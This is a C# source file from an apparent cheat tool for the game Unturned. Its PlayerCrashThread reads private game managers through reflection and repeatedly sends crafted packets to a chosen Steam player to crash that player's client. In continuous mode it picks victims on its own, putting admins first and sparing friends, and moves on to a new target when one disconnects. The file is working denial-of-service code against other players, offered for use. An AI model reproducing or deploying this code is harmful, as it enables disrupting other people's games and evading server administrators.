﻿using System.Linq;
using System.Reflection;
using System.Threading;
using SDG.Unturned;
using Steamworks;    
using Thanking.Attributes;
 using Thanking.Options;
 using Thanking.Utilities;
 using Thanking.Variables;
 using UnityEngine;

namespace Thanking.Threads
{
    public static class PlayerCrashThread
    {
        public static bool PlayerCrashEnabled;
        public static bool ContinuousPlayerCrash;
        public static CSteamID CrashTarget;
        
        [Thread]
        public static void Start()
        {
            Thread.Sleep(5000);
            #if DEBUG
			DebugUtilities.Log("Player Crash Thread Started");
			#endif
            Provider.onEnemyDisconnected += OnDisconnect;

            ResourceManager RInstance;
            AnimalManager AInstance;
            
            byte[] P1 = null;
            byte[] P2 = null;
            byte[] P3 = null;
            byte[] P4 = null;
            byte[] P5 = { (byte)ESteamPacket.UPDATE_UNRELIABLE_CHUNK_INSTANT, 0, 0 };
            
            int S1 = 0;
            int S2 = 0;
            int S3 = 0;
            int S4 = 0;
            int S5 = 3;

            int AID = 0;
            int RID = 0;
            int SID = 0;
            
            while (true)
            {
                if (PlayerCrashEnabled)
                {
                    
                    if (P1 == null)
                    {
                        RInstance = (ResourceManager) typeof(ResourceManager)
                            .GetField("manager", BindingFlags.NonPublic | BindingFlags.Static).GetValue(null);
            
                        AInstance = (AnimalManager) typeof(AnimalManager)
                            .GetField("manager", BindingFlags.NonPublic | BindingFlags.Static).GetValue(null);
            
                        RInstance.channel.getPacket(ESteamPacket.UPDATE_UNRELIABLE_INSTANT,
                            RInstance.channel.getCall("askResources"), out S1, out P1, (byte)0, (byte)0);
            
                        RInstance.channel.getPacket(ESteamPacket.UPDATE_UNRELIABLE_INSTANT,
                            RInstance.channel.getCall("askResources"), out S2, out P2, byte.MaxValue, byte.MaxValue);
            
                        StructureManager.instance.channel.getPacket(ESteamPacket.UPDATE_UNRELIABLE_INSTANT,
                            StructureManager.instance.channel.getCall("askStructures"), out S3, out P3, (byte)0, (byte)0);
            
                        AInstance.channel.getPacket(ESteamPacket.UPDATE_UNRELIABLE_INSTANT,
                            RInstance.channel.getCall("askAnimals"), out S4, out P4);
                                
                        AID = AInstance.channel.id;
                        RID = RInstance.channel.id;
                        SID = StructureManager.instance.channel.id;
                    }
                    
                    switch (MiscOptions.PCrashMethod)
                    {
                        case 1:
                            Provider.send(CrashTarget, ESteamPacket.UPDATE_UNRELIABLE_INSTANT, P1, S1, RID);
                            break;
                        case 2:
                            Provider.send(CrashTarget, ESteamPacket.UPDATE_UNRELIABLE_INSTANT, P2, S2, RID);
                            break;
                        case 3:
                            Provider.send(CrashTarget, ESteamPacket.UPDATE_UNRELIABLE_INSTANT, P3, S3, SID);
                            break;
                        case 4:
                            Provider.send(CrashTarget, ESteamPacket.UPDATE_UNRELIABLE_INSTANT, P4, S4, AID);
                            break;
                        case 5:
                            Provider.send(CrashTarget, ESteamPacket.UPDATE_UNRELIABLE_INSTANT, P5, S5, 0);
                            break;
                    }
                }
                
                else
                {
                    Thread.Sleep(1000);
                    if (!ContinuousPlayerCrash || Provider.clients.Count == 0)
                        continue;

                    PlayerCrashEnabled = true;
                    Thread.Sleep(1000);
                    
                    CrashTarget = Provider.clients.OrderBy(p => p.isAdmin ? 0 : 1)
                        .First(p => !FriendUtilities.IsFriendly(p.player)).playerID.steamID;
                }
            }
        }

        public static void OnDisconnect(SteamPlayer player)
        {
            if (player.playerID.steamID == CrashTarget)
            {
                if (!ContinuousPlayerCrash)
                    PlayerCrashEnabled = false;
                
                else
                    CrashTarget = Provider.clients.OrderBy(p => p.isAdmin ? 0 : 1)
                        .First(p => p.playerID.steamID != CrashTarget && !FriendUtilities.IsFriendly(p.player)).playerID.steamID;
            }
        }  
    }
}
